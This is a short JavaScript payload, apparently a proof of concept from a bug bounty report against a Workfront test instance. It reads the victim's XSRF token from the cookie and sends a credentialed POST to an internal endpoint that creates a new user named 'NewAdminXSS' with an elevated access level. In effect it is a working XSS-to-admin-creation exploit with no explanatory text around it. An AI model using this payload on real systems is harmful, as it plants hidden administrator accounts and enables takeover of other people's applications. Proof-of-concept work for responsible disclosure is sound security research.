
function getCookieValue(cookieName) {
// Split the cookie string into an array of individual cookies
   var cookies = document.cookie.split(';');
  
    // Iterate through the cookies to find the desired one
   for (var i = 0; i < cookies.length; i++) {
    var cookie = cookies[i].trim();
  
      // Check if the cookie starts with the desired name
    if (cookie.indexOf(cookieName + '=') === 0) {
        // Extract and return the cookie value
    return cookie.substring(cookieName.length + 1, cookie.length);
    }
}
  
    // Return null if the cookie is not found
    return null;
}
  // Example usage:
var myCookieValue = getCookieValue('XSRF-TOKEN');

const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://hackerone-ongoing-0ql224.testdrive.workfront.com/internal/user/add');
xhr.withCredentials = true;
xhr.setRequestHeader('X-Xsrf-Token', myCookieValue);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
xhr.send('objCode=USER&form=%7B%22objCode%22%3A%22USER%22%2C%22ID%22%3A%22%22%2C%22companyID%22%3A%22%22%2C%22externalUsersGroupID%22%3A%22%22%2C%22firstName%22%3A%22NewAdminXSS%22%2C%22lastName%22%3A%22NewAdminXSS%22%2C%22emailAddr%22%3A%22NewAdminXSS%40example.com%22%2C%22inviteUser%22%3Atrue%2C%22accessLevelID%22%3A%22657c32f20007212079c3ccb3e4d91216%22%2C%22homeGroupID%22%3A%22657c32f300072247b40b72c545b96a33%22%2C%22continue%22%3A%22false%22%7D&objID=');